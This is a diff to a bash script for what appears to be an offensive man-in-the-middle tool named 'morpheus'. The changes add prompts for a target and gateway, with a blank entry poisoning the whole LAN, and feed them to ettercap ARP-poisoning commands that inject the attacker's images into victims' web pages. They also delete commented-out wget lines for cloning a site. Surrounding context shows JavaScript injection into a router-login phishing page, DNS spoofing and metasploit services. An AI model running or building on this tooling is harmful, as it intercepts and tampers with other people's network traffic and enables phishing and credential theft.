@@ -17,7 +17,7 @@
 ###
 # Resize terminal windows size befor running the tool (gnome terminal)
 # Special thanks to h4x0r Milton@Barra for this little piece of heaven! :D
-resize -s 38 85 > /dev/null
+resize -s 37 85 > /dev/null
 # inicio
 
 
@@ -1472,13 +1472,6 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
 
 
   # dowloading/clonning website target
-  # cd $IPATH/output && mkdir clone && cd clone
-  # echo ${BlueF}[☠]${white} Please wait, clonning webpage${RedF}!${Reset};
-  # sleep 1 && mkdir $GaTe && cd $GaTe
-  # download -nd (no-directory) -nv (low verbose) -Q (download quota) -A (file type) -m (mirror)
-  # wget -qq -U Mozilla -m -nd -nv -Q 900000 -A.html,.jpg,.png,.ico,.php,.js $GaTe | zenity --progress --pulsate --title "☠ MORPHEUS TCP/IP HIJACKING ☠" --text="Cloning webpage: $GaTe" --percentage=0 --auto-close --width 300 > /dev/null 2>&1
-  # inject the javascript <TAG> in cloned index.html using SED command
-
   cd $IPATH/bin/phishing/router-modem
   cp index.html index.rb > /dev/null 2>&1
   echo ${BlueF}[☠]${white} Inject javascript Into clone webpage${RedF}!${Reset};
@@ -1507,7 +1500,6 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
     echo ${BlueF}[☠]${white} Etter.dns configurated...${Reset};
     cd $IPATH
     sleep 1
-
 
 
     # start metasploit services
@@ -1570,8 +1562,11 @@ fi
 sh_stage13 () {
 echo ""
 echo "${BlueF}    ╔───────────────────────────────────────────────────────────────────╗"
-echo "${BlueF}    | ${YellowF}    This filter will substitute the html tag '<img src=>'         ${BlueF}|"
-echo "${BlueF}    | ${YellowF}   and injects your image in any webpage requested by target      ${BlueF}|"
+echo "${BlueF}    | ${YellowF}     This filter will replace the html tag '<img src=>' and       ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  injects your image in any webpage requested by target (http)    ${BlueF}|"
+echo "${BlueF}    | ${YellowF}                                                                  ${BlueF}|"
+echo "${BlueF}    | ${YellowF}  WARNING:Thats no garantie that this filter will work with the   ${BlueF}|"
+echo "${BlueF}    | ${YellowF}recent security implementations added to modern webbrowsers(hsts) ${BlueF}|"
 echo "${BlueF}    ╚───────────────────────────────────────────────────────────────────╝"
 echo ""
 sleep 2
@@ -1581,6 +1576,8 @@ if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
+rhost=$(zenity --title="☠ Enter  RHOST ☠" --text "'morpheus arp poison settings'\n\Leave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
+gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison settings'\nLeave blank to poison all local lan." --entry --width 270) > /dev/null 2>&1
 echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
 cp $IPATH/filters/img_replace.eft $IPATH/filters/img_replace.rb > /dev/null 2>&1
 sleep 1
@@ -1612,20 +1609,20 @@ sleep 1
       if [ "$IpV" = "ACTIVE" ]; then
         if [ "$LoGs" = "NO" ]; then
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one// /$GaTe//
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost// /$gateway//
         else
         echo ${GreenF}[☠]${white} Using IPv6 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one// /$GaTe//
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost// /$gateway//
         fi
 
       else
 
         if [ "$LoGs" = "YES" ]; then
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$fil_one/ /$GaTe/
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -M ARP /$rhost/ /$gateway/
         else
         echo ${GreenF}[☠]${white} Using IPv4 settings${RedF}!${Reset};
-        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$fil_one/ /$GaTe/
+        ettercap -T -Q -i $InT3R -F $IPATH/output/img_replace.ef -L $IPATH/logs/img_replace -M ARP /$rhost/ /$gateway/
         fi
       fi
 
@@ -1900,6 +1897,7 @@ case $choice in
 10) sh_stage10 ;;
 11) sh_stage11 ;;
 12) sh_stage12 ;;
+13) sh_stage13 ;;
 W) sh_stageW ;;
 w) sh_stageW ;;
 S) sh_stageS ;;
